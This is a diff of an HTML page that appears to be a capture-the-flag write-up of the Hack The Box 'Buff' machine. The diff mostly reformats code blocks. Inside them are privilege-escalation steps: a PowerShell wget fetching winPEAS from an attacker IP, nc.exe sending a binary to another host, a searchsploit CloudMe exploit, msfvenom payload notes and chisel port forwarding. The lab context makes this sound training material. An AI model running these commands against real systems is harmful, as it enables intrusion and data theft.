-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;powershell -command <span style="color:#f1fa8c">&#34;wget &#39;http://10.10.14.6:9001/winPEAS.bat&#39; -out winPEAS.bat&#34;</span>
+</span></span></code></pre></div><h2 id="privilege-escalation">privilege escalation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;powershell -command <span style="color:#f1fa8c">&#34;wget &#39;http://10.10.14.6:9001/winPEAS.bat&#39; -out winPEAS.bat&#34;</span>
 </span></span><span style="display:flex;"><span>powershell -command <span style="color:#f1fa8c">&#34;wget &#39;http://10.10.14.6:9001/winPEAS.bat&#39; -out winPEAS.bat&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We find a CloudMe process &hellip; it happens that CloudMe_1112.exe is in shaun/Downloads directory</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#8be9fd;font-style:italic">cd</span> /users/shaun/Downloads
+</span></span></code></pre></div><p>We find a CloudMe process &hellip; it happens that CloudMe_1112.exe is in shaun/Downloads directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#8be9fd;font-style:italic">cd</span> /users/shaun/Downloads
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /users/shaun/Downloads
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;dir
@@ -522,46 +331,17 @@
 </span></span><span style="display:flex;"><span>16/06/2020  16:26        17,830,824 CloudMe_1112.exe
 </span></span><span style="display:flex;"><span>               <span style="color:#bd93f9">1</span> File<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>     17,830,824 bytes
 </span></span><span style="display:flex;"><span>               <span style="color:#bd93f9">2</span> Dir<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>   7,086,542,848 bytes free
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Looking at exploitdb shows it is vulnerable</p>
+</span></span></code></pre></div><p>Looking at exploitdb shows it is vulnerable</p>
 <p>Download the binary</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload<span style="color:#f1fa8c">\n</span>c.exe -w <span style="color:#bd93f9">3</span> 10.10.14.25 <span style="color:#bd93f9">9003</span> &lt; CloudMe_1112.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload<span style="color:#f1fa8c">\n</span>c.exe -w <span style="color:#bd93f9">3</span> 10.10.14.25 <span style="color:#bd93f9">9003</span> &lt; CloudMe_1112.exe
 </span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;
 </span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 </span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/buff$ nc -lnp <span style="color:#bd93f9">9003</span> &gt; CloudMe_1112.exe
 </span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/buff$ file CloudMe_1112.exe
 </span></span><span style="display:flex;"><span>CloudMe_1112.exe: PE32 executable <span style="color:#ff79c6">(</span>GUI<span style="color:#ff79c6">)</span> Intel 80386, <span style="color:#ff79c6">for</span> MS Windows, Nullsoft Installer self-extracting archive
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>CloudMe is a i386 32 bits binary</p>
+</span></span></code></pre></div><p>CloudMe is a i386 32 bits binary</p>
 <h2 id="searchsploit-1">searchsploit</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff searchsploit cloudme
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff searchsploit cloudme
 </span></span><span style="display:flex;"><span>------------------------------------------------------ ---------------------------------
 </span></span><span style="display:flex;"><span> Exploit Title                                        |  Path
 </span></span><span style="display:flex;"><span>------------------------------------------------------ ---------------------------------
@@ -572,24 +352,8 @@
 </span></span><span style="display:flex;"><span>Shellcodes: No Results
 </span></span><span style="display:flex;"><span>_  buff cp /opt/exploitdb/exploits/windows/remote/48389.py .
 </span></span><span style="display:flex;"><span>_  buff chmod +x 48389.py
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Looking at the python script, the payload has been generated with <code>msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python</code>, and we have to modify the target IP to match our machine</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#8be9fd;font-style:italic">$env</span>:PROCESSOR_ARCHITECTURE
+</span></span></code></pre></div><p>Looking at the python script, the payload has been generated with <code>msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python</code>, and we have to modify the target IP to match our machine</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#8be9fd;font-style:italic">$env</span>:PROCESSOR_ARCHITECTURE
 </span></span><span style="display:flex;"><span>x86
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#ff79c6">[</span>System.Environment<span style="color:#ff79c6">]</span>::Is64BitOperatingSystem
 </span></span><span style="display:flex;"><span>True
@@ -599,31 +363,8 @@
 </span></span><span style="display:flex;"><span>Platform ServicePack Version      VersionString
 </span></span><span style="display:flex;"><span>-------- ----------- -------      -------------
 </span></span><span style="display:flex;"><span> Win32NT             10.0.17134.0 Microsoft Windows NT 10.0.17134.0
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>x86 =&gt; Will use i386 architecture</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;powershell
+</span></span></code></pre></div><p>x86 =&gt; Will use i386 architecture</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;powershell
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; netstat -aof | findstr LISTEN
 </span></span><span style="display:flex;"><span>netstat -aof | findstr LISTEN
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
@@ -640,96 +381,31 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">382</span>      <span style="color:#bd93f9">26</span>    <span style="color:#bd93f9">32088</span>      <span style="color:#bd93f9">38548</span>              <span style="color:#bd93f9">5312</span>   <span style="color:#bd93f9">0</span> CloudMe
 </span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">280</span>      <span style="color:#bd93f9">17</span>     <span style="color:#bd93f9">3096</span>       <span style="color:#bd93f9">4132</span>       1.22   <span style="color:#bd93f9">1268</span>   <span style="color:#bd93f9">0</span> CloudMe_1112
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Something is listening on 127.0.0.1:8888</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; Get-Process -Id <span style="color:#ff79c6">(</span>Get-NetTCPConnection -LocalPort 8888<span style="color:#ff79c6">)</span>.OwningProcess
+</span></span></code></pre></div><p>Something is listening on 127.0.0.1:8888</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; Get-Process -Id <span style="color:#ff79c6">(</span>Get-NetTCPConnection -LocalPort 8888<span style="color:#ff79c6">)</span>.OwningProcess
 </span></span><span style="display:flex;"><span>Get-Process -Id <span style="color:#ff79c6">(</span>Get-NetTCPConnection -LocalPort 8888<span style="color:#ff79c6">)</span>.OwningProcess
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Handles  NPM<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>    PM<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>      WS<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>     CPU<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>     Id  SI ProcessName
 </span></span><span style="display:flex;"><span>-------  ------    -----      -----     ------     --  -- -----------
 </span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">351</span>      <span style="color:#bd93f9">24</span>    <span style="color:#bd93f9">30452</span>      <span style="color:#bd93f9">37600</span>              <span style="color:#bd93f9">7096</span>   <span style="color:#bd93f9">0</span> CloudMe
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We found CloudMe but we can&rsquo;t exploit as it is litening on localhost, unless we can port forward</p>
+</span></span></code></pre></div><p>We found CloudMe but we can&rsquo;t exploit as it is litening on localhost, unless we can port forward</p>
 <p>Download and compile Chisel for both my system</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/jpillora/chisel
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/jpillora/chisel
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> chisel
 </span></span><span style="display:flex;"><span>go build
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>List available compiler for target windows operating system (victim)</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  chisel git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> go tool dist list | grep windows
+</span></span></code></pre></div><p>List available compiler for target windows operating system (victim)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  chisel git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> go tool dist list | grep windows
 </span></span><span style="display:flex;"><span>windows/386
 </span></span><span style="display:flex;"><span>windows/amd64
 </span></span><span style="display:flex;"><span>windows/arm
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Compile windows binaries 32 and 64 bits</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>env <span style="color:#8be9fd;font-style:italic">GOOS</span><span style="color:#ff79c6">=</span>windows <span style="color:#8be9fd;font-style:italic">GOARCH</span><span style="color:#ff79c6">=</span>amd64 go build
+</span></span></code></pre></div><p>Compile windows binaries 32 and 64 bits</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>env <span style="color:#8be9fd;font-style:italic">GOOS</span><span style="color:#ff79c6">=</span>windows <span style="color:#8be9fd;font-style:italic">GOARCH</span><span style="color:#ff79c6">=</span>amd64 go build
 </span></span><span style="display:flex;"><span>cp ./chisel.exe ~/htb/buff/http/chisel64.exe
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>env <span style="color:#8be9fd;font-style:italic">GOOS</span><span style="color:#ff79c6">=</span>windows <span style="color:#8be9fd;font-style:italic">GOARCH</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">386</span> go build
 </span></span><span style="display:flex;"><span>cp ./chisel.exe ~/htb/buff/http/chisel32.exe
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Upload and run chisel64.exe on victim as a client, ./chisel on attacker host as a server to port forward remote 127.0.0.1:8888 from victim to 127.0.0.1:9999 on attacker host</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
